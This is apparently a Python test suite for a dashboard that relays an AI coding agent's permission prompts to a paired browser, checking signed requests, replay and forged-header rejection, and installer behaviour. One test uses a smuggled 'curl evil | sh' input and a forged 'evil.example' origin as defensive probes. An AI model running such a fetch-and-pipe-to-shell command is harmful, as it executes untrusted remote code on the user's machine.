"""Approvals: the hook falls through on every failure and trusts only replies signed with the token, the
first answer wins, only the page decides and only what it shows in full, a request lives as long as its hook
and its session's prompt, `sya hooks install` touches only its own entry."""

import json
import os
import signal
import stat
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest
from fakes import FakeApp, no_processes

from see_your_agents.app import pairing, server
from see_your_agents.core.providers.base import LiveSession
from see_your_agents.features import approvals as feature
from see_your_agents.features.approvals import approvals, hook, install, store

SID = "0b7716a8-0401-40a2-8386-1d38281f28c6"
RECORD = {"session_id": SID, "title": "Чиним CI", "cwd": "/w/p", "last_activity": "2026-11-01T00:00:00Z"}
WAITING = LiveSession(
    provider="claude", session_id=SID, kind="background", status="waiting", waiting_for="permission prompt"
)
BUSY = LiveSession(provider="claude", session_id=SID, kind="background", status="busy")
BASH = {"session_id": SID, "tool_name": "Bash", "tool_input": {"command": "rm -rf build", "description": "x"}}
OPTIONS = [{"label": "Red", "description": "warm"}, {"label": "Blue", "description": "cool"}]
QUESTION = {"question": "Which color?", "header": "Color", "multiSelect": False, "options": OPTIONS}
HOOK_IN = {"hook_event_name": "PermissionRequest", "cwd": "/w/p", "permission_mode": "default", **BASH}
ALLOW = {"hookSpecificOutput": {"hookEventName": "PermissionRequest", "decision": {"behavior": "allow"}}}


@pytest.fixture(autouse=True)
def fresh(monkeypatch):
    no_processes(monkeypatch)
    monkeypatch.setattr(approvals, "STORE", store.Store())
    monkeypatch.setattr(approvals, "WAIT_S", 0.2)
    monkeypatch.setattr(approvals, "SETTLE_S", 1.0)
    monkeypatch.setenv("CLAUDE_CODE_ENTRYPOINT", "cli")


@pytest.fixture
def live():
    return {SID: WAITING}


SECRETS: dict[str, str] = {}  # base URL -> the pairing secret of the browser paired with that server


@pytest.fixture
def base(live):
    app = FakeApp([RECORD], live, (feature.FEATURE,))
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), server.make_handler(app, 0))
    port = httpd.server_address[1]
    httpd.RequestHandlerClass = server.make_handler(app, port)
    app.pairing = pairing.Pairing(port)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    url = f"http://127.0.0.1:{port}"
    SECRETS[url] = app.pairing.redeem(app.pairing.new_code())
    yield url
    httpd.shutdown()
    SECRETS.pop(url)


@pytest.fixture
def token():
    return approvals.ensure_token().read_text()


def port_of(base):
    return int(base.rsplit(":", 1)[1])


def post(url, payload, headers):
    """(status, reply) of a raw POST: JSON on 2xx, the bytes otherwise."""
    req = urllib.request.Request(
        url, json.dumps(payload).encode(), {"Content-Type": "application/json", **headers}
    )
    try:
        with urllib.request.urlopen(req) as resp:
            return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read()


def page(base):
    """The headers of the paired page: the host's guard plus the pairing secret."""
    return {"Origin": base, "X-SYA": "1", pairing.HEADER: SECRETS[base]}


def as_hook(base, token):
    """The hook's own client: signed requests, verified replies."""
    return hook.Dashboard(port_of(base), token)


def ask(base, token, payload=BASH):
    return as_hook(base, token).post("/ask", payload, timeout=5)["id"]


class Taker(threading.Thread):
    """A hook polling for its decision, as hook.run does; `state` is what it got last."""

    def __init__(self, base, token, rid):
        super().__init__(daemon=True)
        self.dash, self.rid, self.state, self.decision = as_hook(base, token), rid, "", None
        self.start()

    def run(self):
        while (reply := self.dash.post(f"/{self.rid}/wait", {}, timeout=5))["state"] == "pending":
            pass
        self.state, self.decision = reply["state"], reply.get("decision")


def decide(base, rid, body, lang="en"):
    return post(f"{base}/api/approvals/{rid}/decide", body, {**page(base), "X-SYA-Lang": lang})


def card(base):
    with urllib.request.urlopen(f"{base}/api/board") as resp:
        return next(c for c in json.load(resp)["cards"] if c["session_id"] == SID)


# ---- the server ---------------------------------------------------------------------------------


def signed(token, path, payload, nonce="ab" * 16, at=None):
    at = str(int(time.time())) if at is None else at
    body = json.dumps(payload)
    return {"nonce": nonce, "time": at, "body": body, "mac": hook.mac(token, "req", path, nonce, at, body)}


def test_only_a_request_signed_with_the_token_registers_a_prompt(base, token):
    url, path = f"{base}/api/approvals/ask", "/api/approvals/ask"
    assert post(url, BASH, page(base))[0] == 403  # the page itself, or a web page past the host
    assert post(url, BASH, {**page(base), "Authorization": f"Bearer {token}"})[0] == 403  # no bearer either
    assert post(url, signed("not-the-token", path, BASH), page(base))[0] == 403
    assert (
        post(url, signed(token, "/api/approvals/hello", BASH), page(base))[0] == 403
    )  # signed for elsewhere
    assert post(url, signed(token, path, BASH, at=str(int(time.time()) - 3600)), page(base))[0] == 403
    status, reply = post(url, signed(token, path, BASH, nonce="cd" * 16), page(base))
    assert status == 200 and json.loads(reply["body"])["id"]
    assert post(url, signed(token, path, BASH, nonce="cd" * 16), page(base))[0] == 403  # a replay
    assert approvals.STORE.open_for(SID) and len(approvals.STORE.open_for(SID)) == 1


def test_no_token_file_no_hook(base, token):
    approvals.token_path().unlink()
    with pytest.raises(hook.Gone):
        as_hook(base, token).post("/hello", {}, timeout=5)


def test_only_the_page_decides(base, token):
    rid = ask(base, token)
    taker = Taker(base, token, rid)
    url = f"{base}/api/approvals/{rid}/decide"
    secret = {pairing.HEADER: SECRETS[base]}
    assert post(url, {"behavior": "allow"}, secret)[0] == 403  # a web page: no Origin, no X-SYA
    assert post(url, {"behavior": "allow"}, {"Origin": base, **secret})[0] == 403
    assert (
        post(url, {"behavior": "allow"}, {"Origin": "http://evil.example", "X-SYA": "1", **secret})[0] == 403
    )
    assert decide(base, rid, {"behavior": "allow"}) == (200, {"ok": True})
    taker.join(5)
    assert (taker.state, taker.decision) == ("decided", {"behavior": "allow"})


@pytest.mark.parametrize(
    "extra",
    [{}, {"X-SYA-Pair": "not-a-paired-browser"}, {"Cookie": "sya_pair=x"}, {"Host": "localhost"}],
    ids=["no-secret", "wrong-secret", "a-cookie", "secret-via-localhost"],
)
def test_a_local_process_with_forged_headers_but_no_pairing_secret_cannot_decide(base, token, extra):
    rid = ask(base, token)
    Taker(base, token, rid)
    forged = {"Origin": base, "X-SYA": "1", **extra}  # curl, an agent
    if "Host" in extra:  # the real secret, but to localhost: only 127.0.0.1 counts
        host = base.replace("127.0.0.1", "localhost").removeprefix("http://")
        forged = {"Host": host, "Origin": f"http://{host}", "X-SYA": "1", pairing.HEADER: SECRETS[base]}
    for body in ({"behavior": "allow"}, {"behavior": "deny"}):
        status, reply = post(f"{base}/api/approvals/{rid}/decide", body, forged)
        assert status == 403 and json.loads(reply) == {"error": "This browser isn’t paired", "unpaired": True}
    status, reply = post(
        f"{base}/api/approvals/{rid}/decide", {"behavior": "deny"}, {**forged, "X-SYA-Lang": "ru"}
    )
    assert status == 403 and json.loads(reply)["error"] == "браузер не привязан"
    assert decide(base, rid, {"behavior": "allow"})[0] == 200  # the paired page still can


def test_the_first_answer_wins(base, token):
    rid = ask(base, token)
    Taker(base, token, rid)
    assert decide(base, rid, {"behavior": "allow"})[0] == 200
    assert decide(base, rid, {"behavior": "deny"})[0] == 409
    other = ask(base, token)
    as_hook(base, token).post(f"/{other}/withdraw", {}, timeout=5)  # the terminal answered first
    assert decide(base, other, {"behavior": "allow"})[0] == 409


def test_the_hook_takes_the_decision_once(base, token):
    rid, dash = ask(base, token), as_hook(base, token)
    assert dash.post(f"/{rid}/wait", {}, timeout=5) == {"state": "pending"}
    taker = Taker(base, token, rid)
    decide(base, rid, {"behavior": "deny", "message": " иначе "})
    taker.join(5)
    assert (taker.state, taker.decision) == ("decided", {"behavior": "deny", "message": "иначе"})
    assert dash.post(f"/{rid}/wait", {}, timeout=5) == {"state": "gone"}
    assert dash.post(f"/{'x' * 22}/wait", {}, timeout=5) == {"state": "unknown"}


def test_an_answer_no_hook_takes_is_not_reported_as_sent(base, token):
    rid = ask(base, token)  # its hook was killed: nobody polls
    status, reply = decide(base, rid, {"behavior": "allow"})
    assert status == 409 and "the hook has already ended" in json.loads(reply)["error"]
    assert approvals.STORE.get(rid) is None
    status, reply = decide(base, rid, {"behavior": "allow"}, lang="ru")  # gone: no longer open
    assert status == 409 and json.loads(reply)["error"] == "уже отвечено в терминале или запрос устарел"


def test_a_prompt_answered_in_the_terminal_is_neither_shown_nor_decidable(base, token, live):
    rid = ask(base, token)
    live[SID] = BUSY  # the terminal answered; the hook has not noticed yet
    assert "approvals" not in card(base)
    assert decide(base, rid, {"behavior": "allow"})[0] == 409


def test_only_programs_with_permission_prompts_get_requests(base, token, live):
    """Codex has no Cap.PERMISSION_WAIT: a request naming one of its sessions is refused, never shown."""
    rid = ask(base, token)  # while the session is Claude's
    live[SID] = LiveSession(
        provider="codex",
        session_id=SID,
        kind="interactive",
        status="waiting",
        waiting_for="permission prompt",
    )
    with pytest.raises(hook.Gone):
        ask(base, token)
    assert "approvals" not in card(base)
    assert decide(base, rid, {"behavior": "allow"})[0] == 409
    assert approvals.answers_prompts("claude") and not approvals.answers_prompts("codex")


def test_the_card_carries_what_waits_until_it_is_answered(base, token):
    rid = ask(base, token)
    [shown] = card(base)["approvals"]
    assert (shown["id"], shown["tool"], shown["summary"], shown["text"]) == (
        rid, "Bash", "Bash: rm -rf build", "rm -rf build"
    )  # fmt: skip
    assert shown["fields"] == [["description", "x"]] and shown["complete"] is True
    Taker(base, token, rid)
    decide(base, rid, {"behavior": "allow"})
    assert "approvals" not in card(base)


def test_every_input_field_is_drawn_and_unsandboxed_bash_is_flagged():
    flags = {"dangerouslyDisableSandbox": True, "run_in_background": True, "timeout": 600000}
    shown = approvals.view("Bash", {"command": "make", **flags})
    assert shown["complete"] and shown["text"] == "make"
    assert dict(shown["fields"]) == {"dangerouslyDisableSandbox": "true", "run_in_background": "true",
                                     "timeout": "600000"}  # fmt: skip
    assert shown["warn"] == [approvals.NO_SANDBOX]  # a code: the page words it
    edit = approvals.view(
        "Edit", {"file_path": "/w/p/a", "old_string": "a", "new_string": "b", "replace_all": True}
    )
    assert dict(edit["fields"])["replace_all"] == "true" and edit["complete"]
    mcp = approvals.view("mcp__x__y", {"q": {"nested": [1, 2]}})
    assert json.loads(dict(mcp["fields"])["q"]) == {"nested": [1, 2]} and mcp["complete"]


@pytest.mark.parametrize(
    ("tool", "tool_input"),
    [
        ("Bash", {"command": "x" * (approvals.MAX_BODY + 1)}),
        ("mcp__x__y", {"payload": "y" * (approvals.MAX_FIELD + 1)}),
        ("mcp__x__y", {f"k{i}": i for i in range(approvals.MAX_FIELDS + 1)}),
        (
            "AskUserQuestion",
            {"questions": [{**QUESTION, "options": [{**OPTIONS[0], "preview": "<b>"}, OPTIONS[1]]}]},
        ),
        ("AskUserQuestion", {"questions": "Which color?"}),
    ],
)
def test_what_is_not_shown_in_full_cannot_be_allowed_only_denied(base, token, tool, tool_input):
    rid = ask(base, token, {"session_id": SID, "tool_name": tool, "tool_input": tool_input})
    assert card(base)["approvals"][0]["complete"] is False
    answers = {"answers": {"Which color?": "Red"}} if tool == "AskUserQuestion" else {}
    assert decide(base, rid, {"behavior": "allow", **answers})[0] == 409
    Taker(base, token, rid)
    assert decide(base, rid, {"behavior": "deny"})[0] == 200


def test_the_summary_is_short_enough_for_a_card():
    write = approvals.view("Write", {"file_path": "/w/p/src/a.py", "content": "x" * 9000}, "/w/p")
    assert write["summary"] == "Write: src/a.py" and len(write["text"]) == 9000
    home = str(Path.home())
    assert approvals.view("Edit", {"file_path": f"{home}/x.md"}, "/w/p")["summary"] == "Edit: ~/x.md"
    assert approvals.view("Bash", {"command": "make\nmake test"})["summary"] == "Bash: make"
    assert approvals.view("ExitPlanMode", {"plan": "\n# Plan: ship it\n…"})["summary"] == "Plan: ship it"
    assert (
        approvals.view("mcp__jira__create", {"summary": "PROJ-1"})["summary"] == "mcp__jira__create: PROJ-1"
    )


def test_questions_need_an_answer_each(base, token):
    rid = ask(base, token, {**BASH, "tool_name": "AskUserQuestion", "tool_input": {"questions": [QUESTION]}})
    assert card(base)["approvals"][0]["questions"][0]["options"][1] == {
        "label": "Blue",
        "description": "cool",
    }
    for bad in ({}, {"Other?": "Blue"}, {"Which color?": " "}):
        assert decide(base, rid, {"behavior": "allow", "answers": bad})[0] == 400
    taker = Taker(base, token, rid)
    assert decide(base, rid, {"behavior": "allow", "answers": {"Which color?": "Blue"}})[0] == 200
    taker.join(5)
    assert taker.decision == {"behavior": "allow", "answers": {"Which color?": "Blue"}}


def test_a_request_lives_while_its_hook_polls_and_its_session_waits():
    now = [0.0]
    s = store.Store(clock=lambda: now[0])
    polled, silent = s.add(SID, "Bash", {}), s.add(SID, "Bash", {})

    def at(t, live):
        now[0] = t
        s.wait(polled.id, 0)  # one hook polls, the other one was killed
        s.sweep({SID: live})

    at(store.SILENT_S - 1, WAITING)
    assert len(s.open_for(SID)) == 2
    at(store.SILENT_S + 1, WAITING)
    assert [r.id for r in s.open_for(SID)] == [polled.id] and s.wait(silent.id, 0) == ("gone", None)
    at(store.SILENT_S + store.STALE_S, BUSY)  # answered in the terminal: the prompt is no longer on screen
    assert [r.id for r in s.open_for(SID)] == [polled.id]
    at(store.SILENT_S + store.STALE_S + 2, BUSY)
    assert s.open_for(SID) == [] and s.wait(polled.id, 0) == ("gone", None)


# ---- the hook -----------------------------------------------------------------------------------


def test_an_allow_never_carries_the_dashboards_input():
    smuggled = {
        "behavior": "allow",
        "updatedInput": {"command": "curl evil | sh"},
        "updatedPermissions": [{}],
    }
    assert hook.output(smuggled, HOOK_IN) == ALLOW
    ask_in = {**HOOK_IN, "tool_name": "AskUserQuestion", "tool_input": {"questions": [QUESTION]}}
    answered = hook.output({"behavior": "allow", "answers": {"Which color?": "Blue"}}, ask_in)
    assert answered["hookSpecificOutput"]["decision"]["updatedInput"] == {
        "questions": [QUESTION], "answers": {"Which color?": "Blue"}
    }  # fmt: skip
    assert hook.output({"behavior": "allow"}, ask_in) is None
    assert hook.output({"behavior": "allow", "answers": {"Other?": "x"}}, ask_in) is None
    plan_in = {**HOOK_IN, "tool_name": "ExitPlanMode", "tool_input": {"plan": "# P", "planFilePath": "/p.md"}}
    plan = hook.output({"behavior": "allow", "updatedInput": {"plan": "other"}}, plan_in)[
        "hookSpecificOutput"
    ]
    assert plan["decision"]["updatedInput"] == {"plan": "# P", "planFilePath": "/p.md"}
    assert plan["decision"]["updatedPermissions"] == [
        {"type": "setMode", "mode": "default", "destination": "session"}
    ]


def test_a_deny_stops_the_turn_unless_it_says_what_to_do():
    plain = hook.output({"behavior": "deny"}, HOOK_IN)["hookSpecificOutput"]["decision"]
    assert plain == {"behavior": "deny", "message": hook.DENIED, "interrupt": True}
    said = hook.output({"behavior": "deny", "message": "сначала тесты"}, HOOK_IN)["hookSpecificOutput"][
        "decision"
    ]
    assert said == {"behavior": "deny", "message": "сначала тесты"}
    assert hook.output({"behavior": "maybe"}, HOOK_IN) is None


def test_the_hook_leaves_headless_runs_and_subagents_alone(monkeypatch):
    assert hook.wanted(HOOK_IN)
    assert not hook.wanted({**HOOK_IN, "agent_id": "a5d5"})
    assert not hook.wanted({**HOOK_IN, "hook_event_name": "PreToolUse"})
    monkeypatch.setenv("CLAUDE_CODE_ENTRYPOINT", "sdk-cli")
    assert not hook.wanted(HOOK_IN)


def run_hook(port, token_file, wait=3600.0):
    """The hook as Claude Code runs it: a separate `python -I`, the prompt on stdin."""
    env = {**os.environ, "CLAUDE_CODE_ENTRYPOINT": "cli"}
    return subprocess.Popen(
        [sys.executable, "-I", hook.__file__, "--port", str(port), "--token-file", str(token_file),
         "--wait", str(wait)],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env, text=True,
    )  # fmt: skip


def finished(proc, stdin):
    t0 = time.monotonic()
    out, err = proc.communicate(stdin, timeout=20)
    return proc.returncode, out, err, time.monotonic() - t0


def free_port():
    probe = ThreadingHTTPServer(("127.0.0.1", 0), BaseHTTPRequestHandler)
    port = probe.server_address[1]
    probe.server_close()
    return port


def test_the_hook_falls_through_when_the_dashboard_is_down(token):
    code, out, err, took = finished(run_hook(free_port(), approvals.token_path()), json.dumps(HOOK_IN))
    assert (code, out, err) == (0, "", "") and took < 5


@pytest.mark.parametrize("stdin", ["not json", "[]", json.dumps({**HOOK_IN, "tool_name": None})])
def test_the_hook_falls_through_on_a_bad_prompt(base, token, stdin):
    assert finished(run_hook(port_of(base), approvals.token_path()), stdin)[:3] == (0, "", "")
    assert approvals.STORE.open_for(SID) == []


class Listener(ThreadingHTTPServer):
    """Whatever binds the port: `reply(path, body)` gives the answer; every request and reply is recorded."""

    def __init__(self, reply):
        self.reply, self.wire = reply, []
        listener = self

        class Handler(BaseHTTPRequestHandler):
            def do_POST(self):  # noqa: N802
                body = self.rfile.read(int(self.headers.get("Content-Length") or 0))
                out = listener.reply(self.path, body)
                listener.wire += [str(self.headers).encode() + body, out]
                self.send_response(200)
                self.send_header("Content-Length", str(len(out)))
                self.end_headers()
                self.wfile.write(out)

            def log_message(self, *args):
                pass

        super().__init__(("127.0.0.1", 0), Handler)
        threading.Thread(target=self.serve_forever, daemon=True).start()

    def hook(self, token_file):
        try:
            return finished(run_hook(self.server_address[1], token_file), json.dumps(HOOK_IN))
        finally:
            self.shutdown()


IMPOSTOR = {"ok": True, "id": "r" * 22, "state": "decided", "decision": {"behavior": "allow"}}


@pytest.mark.parametrize(
    "reply",
    [
        lambda path, body: b"<html>not the dashboard</html>",
        lambda path, body: json.dumps(IMPOSTOR).encode(),  # an «allow» without the token
        lambda path, body: json.dumps({"body": json.dumps(IMPOSTOR), "mac": "0" * 64}).encode(),
    ],
)
def test_the_hook_prints_nothing_for_whoever_answers_without_the_token(token, reply):
    impostor = Listener(reply)
    assert impostor.hook(approvals.token_path())[:3] == (0, "", "")
    seen = b"".join(impostor.wire[::2])
    assert b"rm -rf build" not in seen  # `hello` failed: the prompt itself never left


def test_the_token_never_travels(token):
    def dashboard(path, body):  # the real server's envelope code, without the server
        payload, nonce, key = approvals.opened(path, body)
        return json.dumps(json.loads(approvals.sealed(key, path, nonce, IMPOSTOR)[2])).encode()

    real = Listener(dashboard)
    code, out, _err, _took = real.hook(approvals.token_path())
    assert (code, json.loads(out)) == (0, ALLOW)
    assert len(real.wire) >= 6 and not any(token.encode() in b for b in real.wire)


def test_the_hook_gives_up_when_its_wait_is_over_and_withdraws(base, token):
    proc = run_hook(port_of(base), approvals.token_path(), wait=0.5)
    code, out, _err, took = finished(proc, json.dumps(HOOK_IN))
    assert (code, out) == (0, "") and took < 10
    assert approvals.STORE.open_for(SID) == []


def wait_for_request():
    deadline = time.monotonic() + 10
    while not (found := approvals.STORE.open_for(SID)) and time.monotonic() < deadline:
        time.sleep(0.05)
    return found[0]


def test_a_page_answer_reaches_the_hook(base, token):
    proc = run_hook(port_of(base), approvals.token_path())
    proc.stdin.write(json.dumps(HOOK_IN))
    proc.stdin.close()
    assert decide(base, wait_for_request().id, {"behavior": "allow"})[0] == 200
    out = proc.stdout.read()
    assert proc.wait(timeout=10) == 0 and json.loads(out) == ALLOW


def test_sigterm_from_claude_code_withdraws_the_request(base, token):
    proc = run_hook(port_of(base), approvals.token_path())
    proc.stdin.write(json.dumps(HOOK_IN))
    proc.stdin.close()
    rid = wait_for_request().id
    proc.send_signal(signal.SIGTERM)  # Esc in the terminal, or the hook's timeout
    assert proc.wait(timeout=10) == 0 and proc.stdout.read() == ""
    assert approvals.STORE.get(rid) is None  # withdrawn at once, not dropped seconds later


class FakeDashboard:
    """Answers from a script of replies per route; records the calls."""

    def __init__(self, waits):
        self.calls, self.waits, self.asks = [], list(waits), 0

    def post(self, path, payload, timeout):
        self.calls.append(path)
        time.sleep(0.02)
        if path == "/hello":
            return {"ok": True}
        if path == "/ask":
            self.asks += 1
            return {"id": f"r{self.asks}"}
        if path.endswith("/wait"):
            step = self.waits.pop(0) if self.waits else {"state": "pending"}
            if isinstance(step, Exception):
                raise step
            return step
        return {"ok": True}


def test_after_a_dashboard_restart_the_hook_asks_again():
    dash = FakeDashboard([{"state": "unknown"}, {"state": "decided", "decision": {"behavior": "allow"}}])
    assert hook.run(HOOK_IN, dash, 30) == ALLOW
    assert dash.calls == ["/hello", "/ask", "/r1/wait", "/ask", "/r2/wait"]


def test_a_dashboard_that_stays_away_is_given_up_on(monkeypatch):
    monkeypatch.setattr(hook, "OUTAGE_S", 0.2)
    monkeypatch.setattr(hook, "RETRY_S", 0.05)
    dash = FakeDashboard([ConnectionRefusedError()] * 100)
    t0 = time.monotonic()
    assert hook.run(HOOK_IN, dash, 30) is None
    assert time.monotonic() - t0 < 5 and dash.calls[-1] == "/r1/withdraw"


def transcript_line(kind, block):
    role = "assistant" if kind == "tool_use" else "user"
    return json.dumps({"type": role, "message": {"role": role, "content": [block]}}) + "\n"


def test_the_hook_steps_aside_when_the_terminal_answers_first(tmp_path):
    path = tmp_path / "t.jsonl"
    use = {"type": "tool_use", "id": "toolu_1", "name": "Bash", "input": BASH["tool_input"]}
    path.write_text(transcript_line("tool_use", {**use, "id": "toolu_0"}) + transcript_line("tool_use", use))
    dash = FakeDashboard([])
    done = []
    data = {**HOOK_IN, "transcript_path": str(path)}
    worker = threading.Thread(target=lambda: done.append(hook.run(data, dash, 30)))
    worker.start()
    time.sleep(0.3)
    with path.open("a") as f:  # «Yes» in the terminal: the call's result lands in the transcript
        f.write(
            transcript_line("tool_result", {"type": "tool_result", "tool_use_id": "toolu_1", "content": ""})
        )
    worker.join(timeout=5)
    assert done == [None] and dash.calls[-1] == "/r1/withdraw"


def test_the_hook_finds_its_own_call_in_the_transcript(tmp_path):
    path = tmp_path / "t.jsonl"
    other = {"type": "tool_use", "id": "toolu_a", "name": "Bash", "input": {"command": "ls"}}
    mine = {"type": "tool_use", "id": "toolu_b", "name": "Bash", "input": BASH["tool_input"]}
    later = {"type": "tool_use", "id": "toolu_c", "name": "Bash", "input": {"command": "pwd"}}
    path.write_text("".join(transcript_line("tool_use", b) for b in (other, mine, later)) + '{"partial')
    found, offset = hook.find_tool_use(str(path), "Bash", BASH["tool_input"])
    assert found == "toolu_b" and offset == path.stat().st_size - len('{"partial')
    assert hook.find_tool_use(str(path), "Write", {})[0] == ""
    result = transcript_line("tool_result", {"type": "tool_result", "tool_use_id": "toolu_b"})
    with path.open("a") as f:
        f.write('"}\n' + result)
    assert hook.answered_since(str(path), "toolu_b", offset) == (True, path.stat().st_size)


# ---- sya hooks install --------------------------------------------------------------------------


def entries(path):
    return json.loads(path.read_text()).get("hooks", {}).get("PermissionRequest", [])


def apply(port, write=True):
    return install.apply(port, write, allow_worktree=True)  # these tests may run from an agent's worktree


def test_install_keeps_everything_else_and_backs_up(claude_home):
    settings = claude_home / "settings.json"
    claude_home.mkdir()
    theirs = {"matcher": "Bash", "hooks": [{"type": "command", "command": "their-guard.sh"}]}
    original = {"model": "opus", "hooks": {"PreToolUse": [theirs], "PermissionRequest": [theirs]}}
    settings.write_text(json.dumps(original, indent=2))

    printed = apply(8765)

    data = json.loads(settings.read_text())
    assert data["model"] == "opus" and data["hooks"]["PreToolUse"] == [theirs]
    assert entries(settings)[0] == theirs
    ours = entries(settings)[1]["hooks"][0]
    assert ours["timeout"] == install.TIMEOUT_S and "--port 8765" in ours["command"]
    assert hook.__file__ in ours["command"] and str(approvals.token_path()) in ours["command"]
    assert stat.S_IMODE(approvals.token_path().stat().st_mode) == 0o600
    backups = list(claude_home.glob("settings.json.sya-backup-*"))
    assert len(backups) == 1 and json.loads(backups[0].read_text()) == original
    assert "+" in printed and str(backups[0]) in printed


def test_install_is_idempotent_and_uninstall_restores(claude_home):
    settings = claude_home / "settings.json"
    apply(8765)  # no file yet
    assert len(entries(settings)) == 1
    assert "already installed" in apply(8765)
    apply(8780)  # another port replaces the entry, never adds a second one
    assert len(entries(settings)) == 1 and "--port 8780" in entries(settings)[0]["hooks"][0]["command"]
    apply(None)
    assert json.loads(settings.read_text()) == {}
    assert len(list(claude_home.glob("settings.json.sya-backup-*"))) == 2  # each write its own backup


def test_a_symlinked_settings_file_is_written_through(claude_home, tmp_path):
    dotfiles = tmp_path / "dotfiles" / "claude-settings.json"
    dotfiles.parent.mkdir()
    dotfiles.write_text('{"model": "opus"}')
    claude_home.mkdir()
    (claude_home / "settings.json").symlink_to(dotfiles)
    apply(8765)
    assert (claude_home / "settings.json").is_symlink() and len(entries(dotfiles)) == 1
    [backup] = claude_home.glob("settings.json.sya-backup-*")  # next to the link, not in the dotfiles
    assert json.loads(backup.read_text()) == {"model": "opus"} and not backup.is_symlink()
    assert not list(dotfiles.parent.glob("*.sya-backup-*"))


def test_print_writes_nothing_and_bad_settings_are_left_alone(claude_home):
    settings = claude_home / "settings.json"
    claude_home.mkdir()
    settings.write_text('{"model": "opus"}')
    assert '"PermissionRequest"' in apply(8765, write=False)
    assert settings.read_text() == '{"model": "opus"}' and not approvals.token_path().exists()
    settings.write_text("{not json")
    with pytest.raises(SystemExit):
        apply(8765)
    assert settings.read_text() == "{not json" and not list(Path(claude_home).glob("*.sya-backup-*"))


def test_install_from_an_agents_worktree_is_refused(claude_home, monkeypatch):
    monkeypatch.setattr(install, "from_worktree", lambda: True)
    with pytest.raises(SystemExit, match="worktree"):
        install.apply(8765, write=True)
    assert not (claude_home / "settings.json").exists()
    assert "worktree" in install.apply(8765, write=False)  # --print still shows it, with the warning


def test_status_says_whether_the_hook_would_run(claude_home):
    assert install.status().startswith("not installed")
    apply(8765)
    report = install.status()
    assert report.startswith("installed") and "port: 8765" in report and "MISSING" not in report
    approvals.token_path().unlink()
    assert "  token: " in install.status() and "MISSING" in install.status()
